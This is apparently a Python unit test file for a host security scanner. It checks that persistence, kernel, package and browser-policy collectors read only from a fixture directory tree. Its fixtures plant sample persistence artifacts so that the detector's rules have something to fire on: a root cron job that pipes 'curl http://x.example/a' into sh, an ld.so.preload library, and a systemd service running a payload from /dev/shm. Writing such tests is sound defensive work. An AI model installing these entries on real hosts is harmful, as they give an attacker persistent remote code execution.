"""Every system path is resolved under the scan root.

With root pointed at a fixture tree the collectors read nothing from the
live host, which makes whole-host emulation hermetic and is the first step
towards scanning an offline-mounted image.
"""
from __future__ import annotations

import hashlib
import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from falsicore import report
from falsicore.collectors import Audit


def make_audit(root: Path, home: Path) -> Audit:
    with patch("falsicore.collectors.os.geteuid", return_value=1001), \
         patch("falsicore.collectors.os.getuid", return_value=1001):
        audit = Audit("user", target_user="nobody", root=root)
    audit.home = home
    audit.uid = 1001
    audit.command = lambda *a, **k: {"status": "FAILED", "stdout": "", "stderr": "no crontab for nobody",
                                     "exit": 1, "elapsed_ms": 0, "truncated": False, "error": ""}
    return audit


class RootInjection(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name) / "root"
        self.home = self.root / "home/nobody"
        self.home.mkdir(parents=True)

    def write(self, relative: str, data: str) -> Path:
        path = self.root / relative.lstrip("/")
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(data)
        return path

    def test_default_root_is_the_live_host(self):
        audit = make_audit(Path("/"), self.home)
        self.assertEqual(audit.sys("/etc/ld.so.preload"), Path("/etc/ld.so.preload"))
        self.assertEqual(audit.proc_root, Path("/proc"))

    def test_boot_id_and_proc_come_from_the_root(self):
        self.write("/proc/sys/kernel/random/boot_id", "11111111-2222-3333-4444-555555555555\n")
        audit = make_audit(self.root, self.home)
        self.assertEqual(audit.boot_id, "11111111-2222-3333-4444-555555555555")
        self.assertEqual(audit.proc_root, self.root / "proc")

    def test_persistence_reads_only_the_fixture_tree(self):
        self.write("/etc/ld.so.preload", "/opt/x/libevil.so\n")
        self.write("/etc/cron.d/evil", "* * * * * root curl http://x.example/a | sh\n")
        self.write("/etc/systemd/system/evil.service", "[Service]\nExecStart=/dev/shm/payload\n")
        audit = make_audit(self.root, self.home)
        audit.persistence()
        rules = {f["rule"] for f in audit.findings}
        self.assertEqual(rules, {"SYSTEM_LOADER_PRELOAD", "SUSPICIOUS_CRON_EXECUTION", "SUSPICIOUS_SYSTEMD_EXECUTION"})
        for raw in audit.private_index.values():
            self.assertTrue(raw.startswith(str(self.root)) or "://" in raw, raw)

    def test_empty_root_yields_no_host_findings(self):
        audit = make_audit(self.root, self.home)
        audit.environment()
        audit.persistence()
        audit.browsers()
        audit.packages()
        audit.kernel()
        self.assertEqual(audit.findings, [])
        self.assertFalse(any(raw.startswith("/etc/") for raw in audit.private_index.values()))

    def test_environment_and_kernel_read_from_root(self):
        self.write("/etc/os-release", 'ID=fixtureos\nVERSION_ID="9"\nPRETTY_NAME="Fixture OS"\n')
        self.write("/proc/sys/kernel/yama/ptrace_scope", "1\n")
        self.write("/proc/sys/kernel/tainted", "0\n")
        self.write("/proc/modules", "evilmod 16384 0 - Live 0x0\n")
        self.write("/sys/kernel/security/lsm", "lockdown,capability,apparmor")
        audit = make_audit(self.root, self.home)
        audit.environment()
        audit.kernel()
        self.assertEqual(audit.stats["host"]["os_release"]["ID"], "fixtureos")
        self.assertEqual(audit.stats["sysctl_ptrace_scope"], "1")
        self.assertEqual(audit.stats["kernel"]["module_count"], 1)
        self.assertEqual(audit.stats["kernel"]["taint"], "0")

    def test_packages_and_browser_policies_read_from_root(self):
        self.write("/etc/apt/sources.list", "deb [trusted=yes] http://x.example/ stable main\n")
        self.write("/etc/opt/chrome/policies/managed/force.json", json.dumps({"ExtensionInstallForcelist": ["abc"]}))
        audit = make_audit(self.root, self.home)
        audit.packages()
        audit.browsers()
        rules = {f["rule"] for f in audit.findings}
        self.assertEqual(rules, {"INSECURE_APT_REPOSITORY_SETTING", "BROWSER_ENTERPRISE_POLICY"})

    def test_dpkg_index_keys_are_image_paths(self):
        digest = hashlib.md5(b"content", usedforsecurity=False).hexdigest()
        self.write("/var/lib/dpkg/info/pkg.md5sums", f"{digest}  usr/share/pkg/file\n")
        self.write("/var/lib/dpkg/status", "Package: pkg\nConffiles:\n /etc/pkg.conf 0123456789abcdef0123456789abcdef\n\n")
        audit = make_audit(self.root, self.home)
        self.assertEqual(audit._dpkg_md5(audit.sys("/usr/share/pkg/file")), digest)
        self.assertEqual(audit._dpkg_md5(audit.sys("/etc/pkg.conf")), "0123456789abcdef0123456789abcdef")
        self.assertIsNone(audit._dpkg_md5(audit.sys("/usr/share/pkg/other")))
        self.assertEqual(audit.image_path(audit.sys("/etc/pkg.conf")), "/etc/pkg.conf")
        # A path outside the root is taken as the image's own naming (no prefix to strip).
        self.assertEqual(audit.image_path(Path("/usr/share/pkg/file")), "/usr/share/pkg/file")

    def test_host_ref_reads_machine_id_under_root(self):
        self.write("/etc/machine-id", "abcdef0123456789abcdef0123456789\n")
        audit = make_audit(self.root, self.home)
        audit.scan()
        summary = report.report_data(audit)
        self.assertEqual(summary["host_ref"], report.host_ref(self.root))
        self.assertNotEqual(summary["host_ref"], "UNAVAILABLE")


if __name__ == "__main__":
    unittest.main()
